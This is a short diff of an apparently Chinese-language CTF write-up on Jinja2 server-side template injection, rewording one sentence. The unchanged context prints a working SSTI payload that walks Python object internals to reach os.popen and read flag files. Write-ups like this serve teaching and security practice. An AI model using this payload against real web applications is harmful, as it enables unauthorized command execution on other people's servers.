@@ -16,7 +16,7 @@ jinja2是一个类似php smart引擎的视图模板，可以将内容动态的�
 
 可以看到成功了，然后利用jinja可以访问python的内部方法和内置变量
 
-所以最后的payload，说是这么说但是再做还不会
+所以最后的payload，虽然话是这么说但是再做还不会
 ```
 aa{{''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals['linecache'].__dict__['os'].__dict__['popen']('cat flag*').read()}}
 ```
